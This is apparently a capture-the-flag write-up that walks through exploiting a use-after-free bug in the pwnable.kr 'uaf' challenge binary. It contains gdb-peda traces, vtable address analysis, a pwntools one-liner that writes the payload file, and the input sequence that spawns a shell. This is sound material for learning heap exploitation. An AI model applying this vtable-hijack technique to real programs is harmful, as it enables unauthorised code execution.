---
author: george_pick
layout: post
title: "Use After Free: Intro"
excerpt: "pwnable.kr challenge: uaf"
categories: [pwn practice]
---

> Mommy, what is Use After Free bug?
>
> ssh uaf@pwnable.kr -p2222 (pw:guest)

## Read
* [Sensepost](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-used-and-abused-use-after-free/) blog series entry on intro to UAF.
* [Common Weakness Enumeration (CWE)](https://cwe.mitre.org/data/definitions/416.html) page on Use After Free.

> Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.

## Given
Location of which the vulnerable program is currently running:
* `ssh uaf@pwnable.kr -p2222`

## First, lets get on the box

```
...
uaf@pwnable:~$
```

## Look around
Looks like we're going to be working with a CPP exeutable, as we have it's binary and source code:

```bash
...
-rw-r--r--   1 root root     1431 Sep 26  2015 uaf.cpp
-r-xr-sr-x   1 root uaf_pwn 15463 Sep 26  2015 uaf
-rw-r-----   1 root uaf_pwn    22 Sep 26  2015 flag
...
```

## Run it

```bash
./uaf
1. use
2. after
3. free

```

We get a menu of choices, picking `1` yields:

```bash
./uaf
1. use
2. after
3. free
1
My name is Jack
I am 25 years old
I am a nice guy!
My name is Jill
I am 21 years old
I am a cute girl!
1. use
2. after
3. free
```

(For as many times as we enter 1). If instead, we switch to `2`:

```bash
Segmentation fault (core dumped)
```

We immediately segfault, same as option `3`. Source code, we go...

## Examine (given) source code

We have one file, with three classes, and a single `main` function.

### `Human` class

```cpp
using namespace std;
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};
```

Oh - `give_shell` looks like what we're going to need to get executed. That will give us a system shell, which we can than use to just `cat flag`.

### `Man` class

Now we have two "Humans", a Man and a Woman. Both of which have the exact implementation, except print different statements.

```cpp
class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};
```

### `Woman` class

```cpp
class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};
```

### `main`

```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;
...
int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

So we start of by declaring two Humans, a Man and a Woman, which get stored in a pointer to a Human, `m` and `w`, respectively.

Some variables are defined, which look to be to keep track of some size, a `char*` variable for "data", and an integer representing some sort of op.

Then, we go into an infinite loop:
* Print the 1/2/3 menu
* Read from STDIN into our `op` variable.
* Switch statement based on our input:
  * if `1`, call each Humans `introduce()` function and break.
  * if `2`, looks like we found why we were segfaulting before:
    * Read the executable's first argument into the `len` variable
    * Assign our `char* data` to a new char array of size `len`.
    * Read from a file specified as the second argument to the executable into `data`, up to `len` bytes.
    * Print message of allocation
    * Break
  * if `3`, `delete` the `m` and `w` references, and break

So it defintely looks like we're going to use `2` to provide our payload. In the above main code above, we notice that we only allocate the Human objects once, at the very beginning of main. This is fine if we always pick 1. However, if we select the third option, we end up deleting those pointers, but then still staying in the while loop.

So if we choose the option to delete the objects, and then after choose the first option, we'd be accessing memory of an object we deleted! Our pwn is going to take advantage of this, and why it's called _Use After Free_.

Recall from the Human class:

```cpp
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
```

This is what we need to get executed. If we can get the `give_shell` function to be executed, we'll get our shell to the environment.

We can control our input solely through this section of main:

```cpp
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
```

The reference page on that read() can be found [here](https://linux.die.net/man/2/read), it's not the standard `read()` which takes only two arguments.

So we can specify how many bytes to read, and a file to read those bytes from. That will get stored in our `data` variable. We have to somehow get the `give_shell` function executed, probably by using it's location in memory.

I don't program at all in C++, so I had to look up what the [virtual](https://stackoverflow.com/questions/2391679/why-do-we-need-virtual-functions-in-c) keyword meant. I really seemed to like the following answer:
> Without "virtual" you get "early binding". Which implementation of the method is used gets decided at compile time based on the type of the pointer that you call through.
>
> With "virtual" you get "late binding". Which implementation of the method is used gets decided at run time based on the type of the pointed-to object - what it was originally constructed as. This is not necessarily what you'd think based on the type of the pointer that points to that object.
>
> -- [Steve314](https://stackoverflow.com/a/2391781)

So, seems like we should be able to use the virtual function that get's generated for the `give_shell` function. I imagine we can find it in Peda:

```python
uaf@pwnable:~$ gdb uaf
(gdb) source /usr/share/peda/peda.py
gdb-peda$ break *main
Breakpoint 1 at 0x400ec4
...
Breakpoint 1, 0x0000000000400ec4 in main ()
```

Then, we can inspect the code in main:

```python
gdb-peda$ context code 200
```

We see what looks to be the calls to instantiate our Man and Woman:

```python
...
   0x400f10 <main+76>:	mov    rdi,rbx
   0x400f13 <main+79>:	call   0x401264 <_ZN3ManC2ESsi>
   0x400f18 <main+84>:	mov    QWORD PTR [rbp-0x38],rbx
   0x400f1c <main+88>:	lea    rax,[rbp-0x50]
...
   0x400f6e <main+170>:	mov    rdi,rbx
   0x400f71 <main+173>:	call   0x401308 <_ZN5WomanC2ESsi>
   0x400f76 <main+178>:	mov    QWORD PTR [rbp-0x30],rbx
   0x400f7a <main+182>:	lea    rax,[rbp-0x40]
...
```

We can break right after we create the Man, and take another look:

```python
gdb-peda$ break *0x400f18
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
RAX: 0x18d5c50 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x18d5c50 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
...
Breakpoint 2, 0x0000000000400f18 in main ()
```

This looks like what we'd want: `0x401570`.

Let's do the same for the Woman.

```python
...
RAX: 0x18d5ca0 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x18d5ca0 --> 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
...
```

After some googling, looks like there is a [info vtbl](https://visualgdb.com/gdbreference/commands/info_vtbl) command, which will show the Virtual Method table of a given object. However, that doesn't seem to help us at all, since no matter what it doesn't recognize the variables for the Human objects during debugging.

A workaround may be something like this:

```python
info variables .*Man
All variables matching regular expression ".*Man":

Non-debugging symbols:
0x0000000000401560  vtable for Man
0x00000000004015c8  typeinfo name for Man
0x00000000004015d0  typeinfo for Man
```

And then we can inspect the memory location manually:

```python
x/12a 0x0000000000401560
0x401560 <_ZTV3Man>:	0x0	0x4015d0 <_ZTI3Man>
0x401570 <_ZTV3Man+16>:	0x40117a <_ZN5Human10give_shellEv>	0x4012d2 <_ZN3Man9introduceEv>
0x401580 <_ZTV5Human>:	0x0	0x4015f0 <_ZTI5Human>
0x401590 <_ZTV5Human+16>:	0x40117a <_ZN5Human10give_shellEv>	0x401192 <_ZN5Human9introduceEv>
0x4015a0 <_ZTS5Woman>:	0x6e616d6f5735	0x0
0x4015b0 <_ZTI5Woman>:	0x602390 <_ZTVN10__cxxabiv120__si_class_type_infoE@@CXXABI_1.3+16>	0x4015a0 <_ZTS5Woman>
```

So indeed, `0x401570` is the addresses we want (can see it has two virtual function references, one for `give_shell` and the other for `introduce`). If we try to use that:

```python
python -c 'from pwn import *; print(p64(0x401570, endian="little"))' > /tmp/z3n0
./uaf 8 /tmp/z3n0
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
My name is
I am 25 years old
I am a nice guy!
My name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill!p@�YMy name is Jill1
1�
```

Huh, that did not work. Looking back at the peda dump...

Man get's stored into RBP - 0x38:

```python
   0x400f18 <main+84>:	mov    QWORD PTR [rbp-0x38],rbx
```

When we call `1`, we see it get's loaded as such:

```python
   0x400fc3 <main+255>:	cmp    eax,0x1
   0x400fc6 <main+258>:	je     0x400fcd <main+265>
...
   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
   0x400fd4 <main+272>:	add    rax,0x8
   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fdf <main+283>:	mov    rdi,rax
   0x400fe2 <main+286>:	call   rdx
```

If we break on `0x400fcd`:

```python
RAX: 0x1
RBX: 0x9ceca0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
... s ...
RAX: 0x9cec50 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x9ceca0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
... s ...
RAX: 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x9ceca0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
... s ...
# Notice RAX is no longer give_shell
RAX: 0x401578 --> 0x4012d2 (<_ZN3Man9introduceEv>:	push   rbp)
RBX: 0x9ceca0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
... s ...
RDX: 0x4012d2 (<_ZN3Man9introduceEv>:	push   rbp)
=> 0x400fe2 <main+286>:	call   rdx
0x00000000004012d2 in Man::introduce() ()
```

So - the bit that looks to be breaking us is the add of 8 to RAX. If we subtract that from our payload's address, and then retry, we get:

```python
... s ...
RAX: 0x249ac50 --> 0x401568 --> 0x4015d0 --> 0x602390 --> 0x7f3fe1f86260 (<_ZN10__cxxabiv120__si_class_type_infoD2Ev>:	mov    rax,QWORD PTR [rip+0x2edcb1]        # 0x7f3fe2273f18)
RBX: 0x249aca0 --> 0x401568 --> 0x4015d0 --> 0x602390 --> 0x7f3fe1f86260 (<_ZN10__cxxabiv120__si_class_type_infoD2Ev>:	mov    rax,QWORD PTR [rip+0x2edcb1]        # 0x7f3fe2273f18)
... s ...
RAX: 0x401568 --> 0x4015d0 --> 0x602390 --> 0x7f3fe1f86260 (<_ZN10__cxxabiv120__si_class_type_infoD2Ev>:	mov    rax,QWORD PTR [rip+0x2edcb1]        # 0x7f3fe2273f18)
RBX: 0x249aca0 --> 0x401568 --> 0x4015d0 --> 0x602390 --> 0x7f3fe1f86260 (<_ZN10__cxxabiv120__si_class_type_infoD2Ev>:	mov    rax,QWORD PTR [rip+0x2edcb1]        # 0x7f3fe2273f18)
... s ...
RAX: 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
RBX: 0x249aca0 --> 0x401568 --> 0x4015d0 --> 0x602390 --> 0x7f3fe1f86260 (<_ZN10__cxxabiv120__si_class_type_infoD2Ev>:	mov    rax,QWORD PTR [rip+0x2edcb1]
... s ...
RDX: 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
=> 0x400fe2 <main+286>:	call   rdx
... s ...
0x000000000040117a in Human::give_shell() ()
```

Sweet, we're in! Now we can just `cat flag` and be done.

```python
./uaf 8 /tmp/z3n0
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
<_______________>
$
```

One thing to note: I did notice that it only works if you press the after option twice. Doing so only once seg faults. I imagine this is because we have two Human objects, so we need to be able to overwrite both? I spent a bit of time looking around for good explanations of how the Heap's memory managment works, and came across [this paper, "Understanding the heap by breaking it"](https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf).


In there, it says:
> Memory, once it has been free()’d is stored in linked lists called bin’s, they are sorted by size to allow for the quickest access of finding a given chunk for retrieval, that is to say that when you free() memory, it doesn’t actually get returned to the operating system, but rather gets potentially defragmented and coalesced and stored in a linked list in a bin to be retrieved for an allocation later.
> ...
> There are essentially two types of bin, a fastbin and a ‘normal’ bin ...  fastbin’s are small (default maximum size is sixty bytes with a configurable maximum of eighty), they are not coalesced with surrounding chunks on free() ... they are removed in a last in first out (LIFO) manner as opposed to the traditional first in first out (FIFO) method.

Looking at dissasembly again, we see what looks to be the [new allocation](https://stackoverflow.com/a/50500831) space for our Humans (also found this online [demangler](https://demangler.com/):

```python
...
   0x400efb <main+55>:	mov    edi,0x18
   0x400f00 <main+60>:	call   0x400d90 <_Znwm@plt>
...
   0x400f59 <main+149>:	mov    edi,0x18
   0x400f5e <main+154>:	call   0x400d90 <_Znwm@plt>
...

>>> 0x18
24
```

So, seems like the humans are 24 bytes, so we're well within the default fastbin limit, which means we get LIFO on the spaces reserved by these objects.

So even though we `new` them in the order of Man then Woman, and delete them the same, our next go around (where we abuse the heap with our own instructions) will actually get the Woman's memory, since we deleted it most recently.

So we need to use `use` twice, in order to overwrite the Woman and then the Man, since the Man's functions are called first.
